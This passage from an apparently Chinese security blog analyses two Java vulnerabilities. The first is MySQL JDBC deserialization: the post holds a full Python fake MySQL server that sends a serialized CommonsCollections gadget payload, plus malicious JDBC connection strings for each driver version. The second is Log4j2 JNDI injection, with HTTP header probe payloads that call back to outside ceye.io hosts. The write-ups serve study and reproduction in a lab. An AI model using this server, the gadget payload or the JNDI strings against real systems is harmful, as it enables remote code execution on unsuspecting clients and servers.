<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">greeting = <span class="string">&quot;4a0000000a352e372e323600130000005623364e2121182c00fff7c00200ff811500000000000000000000594b096a7d56547301550952006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">responseOK = <span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiving the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#使用java -jar ysoserial [CCn] &quot;calc&quot; &gt; payload生成payload文件</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        send_data(conn, greeting)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn, responseOK)</span><br><span class="line"></span><br><span class="line">            data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&quot;01000001142e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f00002a0000080364656600000014636f6c6c6174696f6e5f636f6e6e656374696f6e000c21002d000000fd00001f000022000009036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f00002900000a0364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000b03646566000000076c6963656e7365000c210009000000fd00001f00002c00000c03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000d03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000e03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f73697a65000c3f001500000008a00000000026000010036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000011036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000012036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000013036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001403646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000015036465660000000c776169745f74696d656f7574000c3f001500000008a00000000019010016013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690f757466385f67656e6572616c5f63690e534554204e414d45532075746638033132300347504c01310831363737373231360236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000017fe000002000200&quot;</span></span><br><span class="line">                send_data(conn,payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, responseOK)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, responseOK)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;@@session.autocommit&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span></span><br><span class="line">                send_data(conn,payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysqlData = <span class="string">&quot;0100000102&quot;</span></span><br><span class="line">                mysqlData += <span class="string">&quot;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&quot;</span></span><br><span class="line">                mysqlData += <span class="string">&quot;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&quot;</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content = get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content) // <span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content) // <span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysqlData += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span> + payload_length_hex</span><br><span class="line">                mysqlData += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysqlData += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysqlData)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line">    <span class="comment">#建立一个ipv4，TCP的socket连接</span></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#绑定IP与端口</span></span><br><span class="line">    sk.bind((HOST,PORT))</span><br><span class="line">    <span class="comment">#建立监听</span></span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST, PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="gQhWB">调试分析</h3>

<p>在<code>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</code>方法处下一个断点，进行分析调式</p>
<p>在<code>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</code>调用<code>ResultSetUtil#resultSetToMap</code>前，会发送<code>SHOW SESSION STATUS</code>数据包。就是在这里发送数据包时，如果没有<code>show warings</code>数据包的响应包返回，就不会走到下一步。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748706429971-0b1acb33-ace9-44c9-8c0a-625e92e354f0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748706429971-0b1acb33-ace9-44c9-8c0a-625e92e354f0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>ResultSetUtil#resultSetToMap</code>方法内，漏洞的触发点是在第二个<code>rs#getObject</code>方法中，第一个<code>rs#getObject</code>返回的是NULL，我们跟进分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748706785680-f875b125-91e5-4dd4-afae-7b13f1b98ac1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748706785680-f875b125-91e5-4dd4-afae-7b13f1b98ac1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入后，会判断字段是否为二进制类型和BLOB类型，如果符合条件的话，就会从MySQL服务器中获取对应的字节码数据。在第三标记部分中，通过判断头部信息<code>-84 19</code>，十六进制对应也就是<code>AC ED</code>，判断它是否为Java的序列化数据。还会判断 autoDeserialize 是否为 true。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748707561079-6bb36084-3e66-4837-ade7-c29244aefe92.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748707561079-6bb36084-3e66-4837-ade7-c29244aefe92.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里进入<code>rs#getObject</code>方法后，一步一步跟进后，最后走到<code>objIn.readObject()</code>反序列化触发点，这里可以看到数据流部分的开头，是<code>-84 -19</code>典型的java序列化数据的头部特征，也就是<code>AC ED</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748706901984-9a7ba0d3-5aec-4198-8869-8e612b293ed9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748706901984-9a7ba0d3-5aec-4198-8869-8e612b293ed9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>执行反序列化的过程中，就会触发反序列化漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748708182339-4f9692f8-e9f2-406a-9276-510dd28b7574.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748708182339-4f9692f8-e9f2-406a-9276-510dd28b7574.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="TLekw">不同 MySQL-JDBC-Driver 的 payload</h3>
<h4 id="Wzm94">8.x</h4>
如该文章demo处

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&quot; +  </span><br><span class="line">        &quot;&amp;autoDeserialize=true&quot; +  </span><br><span class="line">    &quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="OTInB">6.x</h4>

<p>属性名有所不同，queryInterceptors 换为 statementInterceptors</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure>

<h4 id="Go6g4">>=5.1.11</h4>
包名中没有cj

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure>

<h4 id="pQ5i6">5.x <= 5.1.10</h4>

<p>同&gt;&#x3D;5.1.11版本，但需要连接后执行查询操作。</p>
<h4 id="x05GP">5.1.29 - 5.1.40</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>

<h4 id="EuElZ">5.1.28 - 5.1.19</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true</span><br></pre></td></tr></table></figure>



<h3 id="WjcCm">工具</h3>
MySQL-fake-server，纯 Java 实现的 MySQL Fake Server | 支持 GUI 版和命令行版 | 支持反序列化和文件读取的利用方式 | 支持常见的 GADGET 和自定义 GADGET 数据 | 根据目标环境自动生成匹配的 PAYLOAD | 支持 PGSQL 和 DERBY 的利用，项目地址如下

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/4ra1n/mysql-fake-server</span><br></pre></td></tr></table></figure>

<p>启动命令如下，这里使用gui版fake-mysql，启动后可以根据自己的环境输入参数，生成payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar fake-mysql-gui.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748709475025-e773cb49-de66-48b7-ad31-2d94a2637196.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748709475025-e773cb49-de66-48b7-ad31-2d94a2637196.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="dI5se">参考链接</h2>

<p>参考文章如下，感谢大佬们的帮助</p>
<p><a href="https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
<p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j2远程代码执行</title>
    <url>/2025/07/22/Log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="YQB3h">Log4j2远程代码执行</h1>
<h2 id="jHGvr">前言</h2>

<p>Log4j感觉还是比较好利用的，在shagou大佬的面试中，给出一个log4j漏洞绕过payload，要求分析研判，虽说能一眼看出时log4j的利用，但是也是头一次见了。</p>
<h2 id="XbiWP">环境配置</h2>

<ul>
<li>JDK8u65</li>
<li>Log4j 2.14.1</li>
<li>CC3.2.1</li>
</ul>
<p>在8u191后，Log4j还是可以利用的，但是要用高版本的绕过手段</p>
<p>依赖导入如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="yherI">漏洞详情</h2>
<h3 id="VGmps">漏洞成因</h3>

<p>原因是Log4j提供了Lookups的能力(关于Lookups可以点这里去看官方文档的介绍)，简单来说就是变量替换的能力。</p>
<p>在Log4j将要输出的日志拼接成字符串之后，它会去判断字符串中是否包含<code>$&#123;</code>和<code>&#125;</code>,如果包含了，就会当作变量交给<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>这个类去处理，根据前缀调用不同的解析器，其中JNDI解析器就为本次漏洞源头。</p>
<h3 id="qxWBq">探测payload</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap:<span class="comment">//1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span></span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap:<span class="comment">//1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span></span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap:<span class="comment">//1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span></span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap:<span class="comment">//1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span></span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap:<span class="comment">//1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span></span><br><span class="line">True-Client-IP: $&#123;jndi:rmi:<span class="comment">//1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span></span><br><span class="line">Originating-IP: $&#123;jndi:rmi:<span class="comment">//1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span></span><br><span class="line">X-Real-IP: $&#123;jndi:rmi:<span class="comment">//1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span></span><br><span class="line">Client-IP: $&#123;jndi:rmi:<span class="comment">//1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span></span><br><span class="line">X-Api-Version: $&#123;jndi:rmi:<span class="comment">//1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span></span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns:<span class="comment">//1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span></span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns:<span class="comment">//1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span></span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns:<span class="comment">//1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span></span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns:<span class="comment">//1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span></span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns:<span class="comment">//1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span></span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns:<span class="comment">//1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="IQNs8">影响版本</h3>

<ul>
<li>2.x &lt;&#x3D; log4j &lt;&#x3D; 2.15.0-rc1</li>
</ul>
<h2 id="OoDt0">漏洞复现与分析</h2>
<h3 id="MwR8s">漏洞复现</h3>

<p>首先使用yakit工具（可以自己起RMI服务，我这里直接使用工具）生成一个jndi反连地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530165136-526319c2-8a60-4bfa-b0ef-961f46983b3a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530165136-526319c2-8a60-4bfa-b0ef-961f46983b3a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>执行以下代码，生成该类的logger类，调用logger的error方法，payload放入，即可实现JNDI</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger(log4jTest.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:8085/RQqSMKMk&#125;&quot;</span>;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;&#123;&#125;&quot;</span>,s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530486683-e57c8f18-5407-4bf5-bfdf-0656f92adb61.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737530486683-e57c8f18-5407-4bf5-bfdf-0656f92adb61.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="q6JLO">漏洞分析</h3>

<p> 我们看<code>logger.error()</code>（这里error可以换成其他方法，例如info）方法，会调用到<code>loggerConfig#processLogEvent</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processLogEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> LoggerConfigPredicate predicate)</span> &#123;</span><br><span class="line">    event.setIncludeLocation(isIncludeLocation());</span><br><span class="line">    <span class="keyword">if</span> (predicate.allow(<span class="built_in">this</span>)) &#123;</span><br><span class="line">        callAppenders(event);</span><br><span class="line">    &#125;</span><br><span class="line">    logParent(event, predicate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后<code>AbstractOutputStreamAppender#tryAppend</code>会encode对应事件，将<code>$&#123;param&#125;</code>中的param解析出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryAppend</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Constants.ENABLE_DIRECT_ENCODERS) &#123;</span><br><span class="line">        directEncodeEvent(event);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        writeByteArrayToManager(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;</span><br><span class="line">    getLayout().encode(event, manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后调用到<code>StrSubstitutor#resolveVariable</code>，将对应参数解析出结果</p>
